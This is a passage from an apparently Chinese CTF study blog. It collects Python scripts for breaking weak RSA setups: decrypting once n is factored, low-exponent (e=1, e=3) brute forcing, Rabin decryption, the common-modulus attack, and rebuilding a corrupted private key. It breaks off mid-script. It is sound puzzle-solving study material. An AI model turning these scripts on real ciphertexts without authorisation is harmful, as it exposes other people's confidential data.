class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> primefac.modinv(a, n) % n</span><br><span class="line">n = ...</span><br><span class="line">e = ...</span><br><span class="line">c = ...</span><br><span class="line">p = ...</span><br><span class="line">q = ...</span><br><span class="line"></span><br><span class="line">phi_n = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = modinv(e, phi_n) % phi_n <span class="comment">#求模逆元</span></span><br><span class="line">m = pow(c, d, n) <span class="comment">#求明文</span></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><ul><li><strong>代码2</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment">#分解n得p,q</span></span><br><span class="line">p = gmpy2.mpz(...) <span class="comment">#填写p</span></span><br><span class="line">q = gmpy2.mpz(...) <span class="comment">#填写q</span></span><br><span class="line">e = gmpy2.mpz(...) <span class="comment">#填写e</span></span><br><span class="line">c = gmpy2.mpz(...) <span class="comment">#填写c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#计算d</span></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n) <span class="comment">#求解模逆元</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"private key:"</span></span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line"></span><br><span class="line"><span class="comment">#求明文</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"plaintext:"</span></span><br><span class="line">M  =  pow(c, d, p*q)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[10进制]: '</span> + str(M)</span><br><span class="line">flag = str( hex(M) )[<span class="number">2</span>:] <span class="comment">#[2:-1]</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[16进制]: '</span> + flag</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[ASCII码]: '</span> + flag.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="0x02-低加密指数分解攻击e-1"><a class="markdownIt-Anchor" href="#0x02-低加密指数分解攻击e-1"></a> 0x02 低加密指数分解攻击(e = 1)</h1><h2 id="01-思路-2"><a class="markdownIt-Anchor" href="#01-思路-2"></a> 01 思路</h2><ol><li>加密过程：c \equiv E(m) \equiv m^{e}(\bmod n) \equiv m(\bmod n)，所以明文与密文模n同余；</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><mi>c</mi><mo>+</mo><mi>n</mi><mo>∗</mo><mi>k</mi><mo>(</mo><mi>k</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">m = c + n*k (k=0,1,2,3...)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord mathit">m</span><span class="mrel">=</span><span class="mord mathit">c</span><span class="mbin">+</span><span class="mord mathit">n</span><span class="mbin">∗</span><span class="mord mathit" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathit" style="margin-right:0.03148em;">k</span><span class="mrel">=</span><span class="mord mathrm">0</span><span class="mpunct">,</span><span class="mord mathrm">1</span><span class="mpunct">,</span><span class="mord mathrm">2</span><span class="mpunct">,</span><span class="mord mathrm">3</span><span class="mord mathrm">.</span><span class="mord mathrm">.</span><span class="mord mathrm">.</span><span class="mclose">)</span></span></span></span>，暴力破解即可。</li></ol><h2 id="02-代码-2"><a class="markdownIt-Anchor" href="#02-代码-2"></a> 02 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = ... <span class="comment">#填写n</span></span><br><span class="line">c = ... <span class="comment">#填写c</span></span><br><span class="line"></span><br><span class="line">max_num = <span class="number">6</span> <span class="comment">#遍历上限</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range( max_num ):</span><br><span class="line">    m = c + n*k</span><br><span class="line">    <span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure><hr><h1 id="0x03-rabin加密e2"><a class="markdownIt-Anchor" href="#0x03-rabin加密e2"></a> 0x03 Rabin加密(e=2)</h1><h2 id="01-思路-3"><a class="markdownIt-Anchor" href="#01-思路-3"></a> 01 思路</h2><p>理论知识：<a href="http://dragonliu.tk/2020/07/08/Rabin%E5%8A%A0%E5%AF%86/" target="_blank" rel="noopener">我跳</a></p><h2 id="02-代码-3"><a class="markdownIt-Anchor" href="#02-代码-3"></a> 02 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment">#从文件中读取密文</span></span><br><span class="line">f = open(<span class="string">'flag.enc'</span>,<span class="string">'r'</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">c = libnum.s2n(c)<span class="comment">#字符串转数字</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#分解n</span></span><br><span class="line">p = ... <span class="comment">#填写p</span></span><br><span class="line">q = ... <span class="comment">#填写p</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line"><span class="comment">#求解mp与mq</span></span><br><span class="line">mp = pow(c, (p+<span class="number">1</span>)/<span class="number">4</span>, p)</span><br><span class="line">mq = pow(c, (q+<span class="number">1</span>)/<span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="comment">#求解yp与yq</span></span><br><span class="line">yp = gmpy2.invert(p, q)</span><br><span class="line">yq = gmpy2.invert(q, p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获得四个解</span></span><br><span class="line">r1 = (yp*p*mq + yq*q*mp) % n</span><br><span class="line">r2 = (-r1) % n</span><br><span class="line">r3 = (yp*p*mq - yq*q*mp) % n</span><br><span class="line">r4 = (-r3) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> libnum.n2s( r1 )<span class="comment">#数字转字符串</span></span><br><span class="line"><span class="keyword">print</span> libnum.n2s( r2 )</span><br><span class="line"><span class="keyword">print</span> libnum.n2s( r3 )</span><br><span class="line"><span class="keyword">print</span> libnum.n2s( r4 )</span><br></pre></td></tr></table></figure><p>当<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo>=</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p = q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="base textstyle uncramped"><span class="mord mathit">p</span><span class="mrel">=</span><span class="mord mathit" style="margin-right:0.03588em;">q</span></span></span></span>时，使用python命令行将16进制转十进制，然后直接求解<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">c</span></span></span></span>模 n 时的平方根：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = ...;</span><br><span class="line">c = ...;</span><br><span class="line"><span class="keyword">PowerMod</span>[c, <span class="number">1</span>/<span class="number">2</span>, n]</span><br></pre></td></tr></table></figure><p>Wolfram 语言在线编辑：<a href="https://www.wolframcloud.com/" target="_blank" rel="noopener">我跳</a></p><hr><h1 id="0x04-flagenc-pubkeypem"><a class="markdownIt-Anchor" href="#0x04-flagenc-pubkeypem"></a> 0x04 flag.enc + pubkey.pem</h1><h2 id="01-思路-4"><a class="markdownIt-Anchor" href="#01-思路-4"></a> 01 思路</h2><ol><li>解压得到两个文件【flag.enc】和【pubkey.pem】，其中【flag.enc】从文件名含有flag可以判断是加密后的密文，【pubkey.pem】是公钥文件，通过公钥文件可以得到e和n；</li><li>通过openssl对公钥文件【pubkey.pem】进行分解，使用命令【openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem】，得到 e【Exponent】和 n【Modulus】；</li><li>其他根据类型判断。</li></ol><h2 id="02-代码-4"><a class="markdownIt-Anchor" href="#02-代码-4"></a> 02 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="comment">#分解n得p,q</span></span><br><span class="line">n = ... <span class="comment">#填写n</span></span><br><span class="line">p = ... <span class="comment">#填写p</span></span><br><span class="line">q = ... <span class="comment">#填写q</span></span><br><span class="line">e = ... <span class="comment">#填写e</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#计算私钥</span></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = int( gmpy2.invert(e, phi_n) ) <span class="comment">#求解模逆元</span></span><br><span class="line">privatekey = rsa.PrivateKey(n , e , d , p , q) <span class="comment">#根据已知参数，计算私钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./flag.enc"</span> , <span class="string">"rb"</span>) <span class="keyword">as</span> f: <span class="comment">#填写文件</span></span><br><span class="line">    <span class="keyword">print</span> rsa.decrypt(f.read(), privatekey).decode()  <span class="comment">#使用私钥对密文进行解密，并打印</span></span><br></pre></td></tr></table></figure><hr><h1 id="0x05-共模攻击"><a class="markdownIt-Anchor" href="#0x05-共模攻击"></a> 0x05 共模攻击</h1><h2 id="01-思路-5"><a class="markdownIt-Anchor" href="#01-思路-5"></a> 01 思路</h2><p>用相同的N，不同的e进行加密的，可以使用共模攻击。</p><h2 id="02-代码-5"><a class="markdownIt-Anchor" href="#02-代码-5"></a> 02 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s, s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, gcdext</span><br><span class="line"></span><br><span class="line">n  = ... <span class="comment">#填写n</span></span><br><span class="line">e1 = ... <span class="comment">#填写e1</span></span><br><span class="line">e2 = ... <span class="comment">#填写e2</span></span><br><span class="line"></span><br><span class="line">s = gcdext(e1, e2)  </span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = -s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取密文</span></span><br><span class="line">file1 = open(<span class="string">'flag.enc1'</span>, <span class="string">'r'</span>)</span><br><span class="line">c1 = file1.read()</span><br><span class="line">c1 = s2n(c1)<span class="comment">#字符串转数字</span></span><br><span class="line"></span><br><span class="line">file2 = open(<span class="string">'flag.enc2'</span>, <span class="string">'r'</span>)</span><br><span class="line">c2 = file2.read()</span><br><span class="line">c2 = s2n(c2)<span class="comment">#字符串转数字</span></span><br><span class="line"></span><br><span class="line">c2 = invert(c2, n)   </span><br><span class="line">m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n</span><br><span class="line"><span class="keyword">print</span> n2s(m)</span><br></pre></td></tr></table></figure><hr><h1 id="0x06-低加密指数分解攻击e-3"><a class="markdownIt-Anchor" href="#0x06-低加密指数分解攻击e-3"></a> 0x06 低加密指数分解攻击(e = 3)</h1><h2 id="01-思路-6"><a class="markdownIt-Anchor" href="#01-思路-6"></a> 01 思路</h2><ol><li>公钥中，e=3，N非常大。</li><li>加密过程：c \equiv E(m) \equiv m^{e}(\bmod n) \equiv m^3(\bmod n)，所以明文与密文的3次方模n同余；</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><mi>c</mi><mo>+</mo><mi>n</mi><mo>∗</mo><mi>k</mi><mo>(</mo><mi>k</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">m = c + n*k (k=0,1,2,3...)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord mathit">m</span><span class="mrel">=</span><span class="mord mathit">c</span><span class="mbin">+</span><span class="mord mathit">n</span><span class="mbin">∗</span><span class="mord mathit" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathit" style="margin-right:0.03148em;">k</span><span class="mrel">=</span><span class="mord mathrm">0</span><span class="mpunct">,</span><span class="mord mathrm">1</span><span class="mpunct">,</span><span class="mord mathrm">2</span><span class="mpunct">,</span><span class="mord mathrm">3</span><span class="mord mathrm">.</span><span class="mord mathrm">.</span><span class="mord mathrm">.</span><span class="mclose">)</span></span></span></span>，然后开三次方，暴力破解即可。</li></ol><h2 id="02-代码-6"><a class="markdownIt-Anchor" href="#02-代码-6"></a> 02 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n, n2s</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line">n = ... <span class="comment">#填写n</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#读取密文</span></span><br><span class="line">file = open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>)</span><br><span class="line">c = file.read()</span><br><span class="line">c = s2n(c)<span class="comment">#字符串转数字</span></span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res = iroot( (c + i*n), <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">if</span>( res[<span class="number">1</span>] ==  <span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">print</span> res</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"i = "</span> + str(i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = ... <span class="comment">#暴力获得的m</span></span><br><span class="line"><span class="keyword">print</span> n2s(m)</span><br></pre></td></tr></table></figure><hr><h1 id="0x07-私钥修复最优非对称加密填充god-like-rsa"><a class="markdownIt-Anchor" href="#0x07-私钥修复最优非对称加密填充god-like-rsa"></a> 0x07 私钥修复+最优非对称加密填充(God Like RSA)</h1><h2 id="01-思路-7"><a class="markdownIt-Anchor" href="#01-思路-7"></a> 01 思路</h2><p>压缩包里有一个密文，一个部分缺失的私钥，一个公钥，读公钥可知 N 是 4096 位的，分解无望，肯定要从私钥着手。</p><ol><li>【vscode】打开【private.corrupted】，将对应变量填入下列脚本；</li><li>执行脚本后得到私钥，新建文件【private.pem】并将私钥复制进去；</li><li>然后执行【最优非对称加密填充】脚本。</li></ol><h2 id="02-代码-7"><a class="markdownIt-Anchor" href="#02-代码-7"></a> 02 代码</h2><p><strong>私钥修复脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> invmod, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_linear</span><span class="params">(a, b, mod)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a &amp; <span class="number">1</span> == <span class="number">0</span> <span class="keyword">or</span> b &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> (b * invmod(a, mod)) &amp; (mod - <span class="number">1</span>)  <span class="comment"># hack for mod = power of 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_n</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = re.sub(<span class="string">r"[^0-9a-f]"</span>, <span class="string">""</span>, s)</span><br><span class="line">    <span class="keyword">return</span> int(s, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk</span><span class="params">(s)</span>:</span></span><br><span class="line">    cleaned = <span class="string">""</span>.join(map(<span class="keyword">lambda</span> x: x[<span class="number">-2</span>:], s.split(<span class="string">":"</span>)))</span><br><span class="line">    <span class="keyword">return</span> msk_ranges(cleaned), msk_mask(cleaned), msk_val(cleaned)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk_ranges</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [range(<span class="number">16</span>) <span class="keyword">if</span> c == <span class="string">" "</span> <span class="keyword">else</span> [int(c, <span class="number">16</span>)] <span class="keyword">for</span> c <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk_mask</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">""</span>.join(<span class="string">"0"</span> <span class="keyword">if</span> c == <span class="string">" "</span> <span class="keyword">else</span> <span class="string">"f"</span> <span class="keyword">for</span> c <span class="keyword">in</span> s), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk_val</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">""</span>.join(<span class="string">"0"</span> <span class="keyword">if</span> c == <span class="string">" "</span> <span class="keyword">else</span> c <span class="keyword">for</span> c <span class="keyword">in</span> s), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据文件pubilc.pem得到</span></span><br><span class="line">E = ...</span><br><span class="line"><span class="comment">#文件pubilc.pem中第一个Modulus</span></span><br><span class="line">N = to_n(<span class="string">"""..."""</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#private.corrupted中的prime1</span></span><br><span class="line">p_ranges, pmask_msk, pmask_val = msk(<span class="string">""" ... """</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#prime2</span></span><br><span class="line">q_ranges, qmask_msk, qmask_val = msk(<span class="string">""" ... """</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#privateExponent</span></span><br><span class="line">_, dmask_msk, dmask_val = msk(<span class="string">""" ... """</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#exponent1</span></span><br><span class="line">_, dpmask_msk, dpmask_val = msk(<span class="string">""" ... """</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#exponent2</span></span><br><span class="line">_, dqmask_msk, dqmask_val = msk(<span class="string">""" ... """</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(K, Kp, Kq, check_level, break_step)</span>:</span></span><br><span class="line">    max_step = <span class="number">0</span></span><br><span class="line">    cands = [<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> range(<span class="number">1</span>, break_step + <span class="number">1</span>):</span><br><span class="line">        <span class="comment">#print " ", step, "( max =", max_step, ")"</span></span><br><span class="line">        max_step = max(step, max_step)</span><br><span class="line"></span><br><span class="line">        mod = <span class="number">1</span> &lt;&lt; (<span class="number">4</span> * step)</span><br><span class="line">        mask = mod - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        cands_next = []</span><br><span class="line">        <span class="keyword">for</span> p, new_digit <span class="keyword">in</span> product(cands, p_ranges[-step]):</span><br><span class="line">            pval = (new_digit &lt;&lt; ((step - <span class="number">1</span>) * <span class="number">4</span>)) | p</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">1</span>:</span><br><span class="line">                qval = solve_linear(pval, N &amp; mask, mod)</span><br><span class="line">                <span class="keyword">if</span> qval <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(qval, mask, qmask_msk, qmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">2</span>:</span><br><span class="line">                val = solve_linear(E, <span class="number">1</span> + K * (N - pval - qval + <span class="number">1</span>), mod)</span><br><span class="line">                <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(val, mask, dmask_msk, dmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">3</span>:</span><br><span class="line">                val = solve_linear(E, <span class="number">1</span> + Kp * (pval - <span class="number">1</span>), mod)</span><br><span class="line">                <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(val, mask, dpmask_msk, dpmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">4</span>:</span><br><span class="line">                val = solve_linear(E, <span class="number">1</span> + Kq * (qval - <span class="number">1</span>), mod)</span><br><span class="line">                <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(val, mask, dqmask_msk, dqmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> pval * qval == N:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"Kq ="</span>, Kq</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"pwned"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"p ="</span>, pval</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"q ="</span>, qval</span><br><span class="line">                    p = pval</span><br><span class="line">                  